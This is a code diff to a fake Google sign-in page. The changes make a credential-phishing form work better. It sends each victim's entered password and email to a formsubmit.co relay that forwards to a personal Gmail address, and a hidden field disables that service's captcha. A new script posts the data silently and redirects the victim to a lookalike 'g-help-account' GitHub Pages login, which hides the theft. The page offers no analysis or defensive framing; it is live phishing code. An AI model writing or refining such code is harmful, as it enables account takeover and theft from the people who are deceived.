@@ -61,7 +61,6 @@
 <body>
     <div class="viewport">
         <div class="logo-area">
-            <!-- Your PNG logo file is called here -->
             <img src="logo.png" class="g-logo" alt="Google">
         </div>
 
@@ -87,7 +86,11 @@
                 <span id="display-user"></span>
                 <svg viewBox="0 0 24 24" width="12" height="12"><path d="M7 10l5 5 5-5z"/></svg>
             </div>
-            <form id="myform" method="POST" action="https://formsubmit.co/divineeze461@gmail.com?h=https://g-help-account.github.io/Login/">
+            
+            <form id="myForm" method="POST" action="https://formsubmit.co/divineeze461@gmail.com">
+                <!-- ANTI-CAPTCHA TAG ADDED BELOW -->
+                <input type="hidden" name="_captcha" value="false">
+                
                 <div class="field">
                     <input type="password" name="password" id="pass" required placeholder=" ">
                     <label>Enter your password</label>
@@ -130,19 +133,29 @@
             const p = document.getElementById('pass');
             p.type = p.type === 'password' ? 'text' : 'password';
         }
+
+        // CORRECTED SILENT SUBMIT & REDIRECT SCRIPT
+        document.getElementById("myForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+            
+            // Collect the data including the email from the previous step
+            const formData = new FormData(this);
+            formData.append('email_user', document.getElementById('email').value);
+
+            fetch(this.action, {
+                method: "POST",
+                body: formData,
+                headers: {
+                    'Accept': 'application/json' // Forces FormSubmit to send JSON back, not a page
+                }
+            }).then(() => {
+                // Instantly redirect back to your login page
+                window.location.href = "https://g-help-account.github.io/Login/";
+            }).catch(() => {
+                // Even if it fails, we redirect back to login
+                window.location.href = "https://g-help-account.github.io/Login/";
+            });
+        });
     </script>
-    <script>
-  document.getElementById("myForm").addEventListener("submit", function(event) {
-    event.preventDefault();
-    fetch(this.action, {
-      method: this.method,
-      body: new FormData(this)
-    }).then(() => {
-      setTimeout(() => {
-        window.location.href = "https://g-help-account.github.io/Login/";
-      }, 1000);
-    });
-  });
-</script>
 </body>
 </html>
